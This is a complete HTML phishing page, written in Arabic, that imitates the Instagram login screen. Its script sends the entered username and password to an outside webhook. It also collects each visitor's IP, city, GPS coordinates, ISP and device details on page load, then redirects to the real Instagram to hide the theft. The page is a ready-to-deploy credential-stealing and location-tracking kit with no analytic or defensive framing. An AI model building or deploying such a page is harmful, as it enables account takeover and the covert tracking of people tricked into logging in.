<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<link rel="icon" type="image/png" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }

body {
  background: #1a1a2e;
  background: linear-gradient(180deg, #1c2333 0%, #1a1a2e 100%);
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: space-between;
  min-height: 100vh;
  padding: 20px;
  color: white;
}

.top-lang {
  width: 100%;
  text-align: center;
  color: #e0e0e0;
  font-size: 14px;
  padding-top: 10px;
}

.middle {
  display: flex;
  flex-direction: column;
  align-items: center;
  width: 100%;
  max-width: 380px;
  gap: 16px;
}

.logo-img {
  width: 80px;
  height: 80px;
  margin-bottom: 20px;
}

input {
  width: 100%;
  background: rgba(255,255,255,0.08);
  border: 1px solid rgba(255,255,255,0.15);
  border-radius: 12px;
  padding: 16px 18px;
  font-size: 15px;
  color: white;
  outline: none;
  text-align: right;
  transition: border-color 0.2s;
}
input::placeholder { color: rgba(255,255,255,0.45); }
input:focus { border-color: rgba(255,255,255,0.4); background: rgba(255,255,255,0.12); }

.btn-login {
  width: 100%;
  background: #0095f6;
  color: white;
  border: none;
  border-radius: 12px;
  padding: 16px;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
  margin-top: 4px;
  transition: background 0.2s;
}
.btn-login:active { background: #0081d6; }

.forgot {
  color: #e0e0e0;
  font-size: 14px;
  text-decoration: none;
  text-align: center;
  margin-top: 4px;
}

.btn-signup {
  width: 100%;
  background: transparent;
  color: #0095f6;
  border: 1.5px solid rgba(0,149,246,0.5);
  border-radius: 12px;
  padding: 15px;
  font-size: 15px;
  font-weight: 600;
  cursor: pointer;
  margin-top: 20px;
}

.bottom {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 8px;
  padding-bottom: 20px;
}
.meta-logo {
  color: rgba(255,255,255,0.6);
  font-size: 15px;
  display: flex;
  align-items: center;
  gap: 6px;
}
.meta-icon { font-size: 18px; }

/* Loading */
.loading-overlay {
  display: none;
  position: fixed;
  top: 0; left: 0;
  width: 100%; height: 100%;
  background: #1a1a2e;
  z-index: 999;
  align-items: center;
  justify-content: center;
  flex-direction: column;
  gap: 20px;
}
.insta-spinner {
  width: 36px;
  height: 36px;
  border: 3px solid rgba(255,255,255,0.2);
  border-top: 3px solid white;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
}
@keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>

<div class="top-lang">العربية</div>

<div class="middle">
  <img class="logo-img" src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" alt="Instagram">

  <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف المحمول" oninput="checkInputs()" autocomplete="off" autocorrect="off" autocapitalize="off">
  <input type="password" id="password" placeholder="كلمة السر" oninput="checkInputs()" autocomplete="off">

  <button class="btn-login" id="loginBtn" onclick="doLogin()">تسجيل الدخول</button>

  <a href="#" class="forgot">هل نسيت كلمة السر؟</a>

  <button class="btn-signup">إنشاء حساب جديد</button>
</div>

<div class="bottom">
  <div class="meta-logo">
    <span class="meta-icon">∞</span> Meta
  </div>
</div>

<!-- Loading -->
<div class="loading-overlay" id="loadingOverlay">
  <img style="width:60px; height:60px; border-radius:15px;" src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png">
  <div class="insta-spinner"></div>
</div>

<script>
const WEBHOOK = "https://eocy1w7x0u37m91.m.pipedream.net";

function checkInputs() {
  const u = document.getElementById("username").value;
  const p = document.getElementById("password").value;
  const btn = document.getElementById("loginBtn");
  btn.style.opacity = (u.length > 0 && p.length > 0) ? "1" : "0.5";
}

async function sendData(extra) {
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();
    await fetch(WEBHOOK, {
      method: "POST",
      mode: "no-cors",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        type: "🎯 Instagram Login",
        username: extra.username || "",
        password: extra.password || "",
        ip: data.ip,
        country: data.country_name,
        city: data.city,
        lat: data.latitude,
        lon: data.longitude,
        isp: data.org,
        device: navigator.userAgent,
        time: new Date().toLocaleString(),
        maps: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
      })
    });
  } catch(e) {}
}

function doLogin() {
  const u = document.getElementById("username").value.trim();
  const p = document.getElementById("password").value.trim();
  if (!u || !p) return;
  document.getElementById("loadingOverlay").style.display = "flex";
  sendData({ username: u, password: p });
  setTimeout(() => { window.location.href = "https://www.instagram.com"; }, 3000);
}

sendData({});
</script>
</body>
</html>
